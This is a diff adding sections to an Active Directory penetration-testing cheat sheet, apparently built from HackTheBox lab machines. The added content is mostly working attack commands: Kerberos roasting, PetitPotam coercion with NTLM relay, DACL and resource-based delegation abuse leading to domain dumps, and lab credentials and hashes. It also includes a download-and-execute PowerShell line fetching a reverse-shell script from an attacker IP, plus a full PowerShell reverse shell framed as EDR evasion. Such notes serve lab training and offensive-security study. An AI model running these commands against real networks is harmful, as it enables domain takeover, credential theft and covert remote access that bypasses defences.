@@ -44,6 +44,7 @@
 - <<ssh, SSH>>
 - <<Delegations, Delegations>>
 - <<privesc, Privilage Escalation>>
+  * <<file, File Transfering>>
   * <<backup, SeBackupPrivilege>>
   * <<SeImpersonatePrivilege, SeImpersonatePrivilege>>
   * <<dpapi,  DPAPI secrets>>
@@ -155,6 +156,17 @@ nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain
 ```
 
 More info about https://www.netexec.wiki/ldap-protocol/asreproast[here]
+
+Anouther trick about asrep-roasting it is if we got a user who doesn't require preauth to domain we can request a ticket via this user
+
+```bash
+impacket-GetUserSPNs rebound.htb/  -no-preauth jjones -usersfile usernames.txt -dc-host 10.129.232.31
+```
+
+Requires new versions of `impacket`
+
+
+
 
 [[Kerberoasting]]
 == Kerberoasting
@@ -439,6 +451,37 @@ Right part of hash is always returned but Left part not always so
 Second part of NTLM relay attack it is trigger target computer to auth to domain controller throught our listener this attack named as Man-In-The-Middle
  attacks it's a god practice like PetitPotam so can be trigged by netexec module coerse_plus
 
+Find a vulnerable trigger in system 
+
+```bash
+nxc smb 10.129.232.31 -u ldap_monitor -p '1GR8t@$$4u' -M coerse_plus
+```
+
+So if vulnerability exists we can use a `PetitPotam.py` for more advanced exploitation or netexec module `coerse_plus`
+
+If we can create a machines check 
+
+```bash
+nxc smb 10.129.232.31 -u ldap_monitor -p '1GR8t@$$4u' -M maq
+```
+
+We can add `SPN` with our `DNS` record for example our local ip `10.10.10.10` . If we have a permission to write a DNS record to other computers it's better
+
+Start `NTLM` relay listener
+
+```bash
+impacket-ntlmrelayx -t ldaps://192.168.100.100 -smb2support -i -domain mist.htb
+```
+
+```bash
+nxc smb 192.168.100.101  -u brandon.keywarp -H db03d6a77a2205bc1d07082740626cc9 -M coerce_plus -o NETHOD=PetitPotam LISTENER=some_dns_which_was_modified
+```
+
+
+
+```bash
+python3 PetitPotam.py -u brandon.keywarp -no-pass -hashes ':db03d6a77a2205bc1d07082740626cc9' -pipe all 'MS01@5050/colosion'  192.168.100.101
+```
 
 [[Backups]]
 == Backups
@@ -707,6 +750,12 @@ net rpc group addmem "target_group" "low_priv_user" -U "domain"/"low_priv_user"%
 ```
 
 https://www.hackingarticles.in/abusing-ad-dacl-writeowner/[abusing-ad-dacl-writeowner]
+
+Write Owner over user account
+
+```bash
+impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'oorend' -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'rebound.htb'/'oorend':'1GR8t@$$4u' -use-ldaps -debug -k -no-pass -dc-ip 10.129.232.31 -dc-host dc01.rebound.htb
+```
 
 [[GPO]]
 === GPO abuse
@@ -1277,7 +1326,34 @@ impacket-getST -spn 'cifs/dc01.vintage.htb' -altservice 'HTTP/dc01.vintage.htb' 
 
 If you don't have this scenario think about which computer account i control? Can i add it a privileges? 
 
+If we have a privilage to create a `Resource-based constrained` 
 
+```bash
+impacket-rbcd -delegate-from 'ldap_monitor' -delegate-to delegator$ -dc-ip '10.129.232.31' -action write 'rebound.htb/delegator$' -k -no-pass -dc-host dc01.rebound.htb -use-ldaps
+```
+
+While requesting a more privileged user `Service Ticket` we got errors
+
+```bash
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
+```
+
+Target user can be protected for delegation but nowhere `DC01$` 
+
+If we do a `Resource-based constrained`  delegation we can extract `DC01$` service ticket
+
+```bash
+impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u'  -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$' -k
+```
+
+But with it we don't have an access to `cifs` (FIle System)
+
+```bash
+impacket-getST -spn 'http/dc01.rebound.htb' -impersonate 'DC01$' -altservice 'cifs' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb 'rebound.htb/delegator$' -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
+```
+
+We request a ticket via previous ticket to `cifs` service in system. Then try to dump domain by `impacket-secretsdump`
 
 [[privesc]]
 == Privilage Escalation
@@ -1323,6 +1399,31 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
+```
+
+[[file]]
+== File Transfering
+
+If EDR and AMSI catches us we can try to load PowerShell script in *MEMORY*
+
+```bash
+iex (New-Object Net.WebClient).DownloadString('http://10.10.14.162/reverse.ps1')
+```
+
+To avoid logs in system use `InviShell` 
+
+Then try AMSI bypass one-liners
+
+Obfuscated reverse shell to avoid EDR
+
+```bash
+$c = New-Object System.Net.Sockets.TCPClient("10.10.14.162", 9001); $s = $c.GetStream(); [byte[]]$b = 0..65535| %{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + "PS" + "> "; $sby = ([text.encoding]:: ASCII).GetBytes($sb2); $s.Write($sby,0,$sby.Length); $s. Flush()}; $c.Close()$
+```
+
+Check where EDR excludes path where we can run any script. Exist tools for this mission but i prefer to check logs
+
+```bash
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
 ```
 
 [[SeImpersonatePrivilege]]
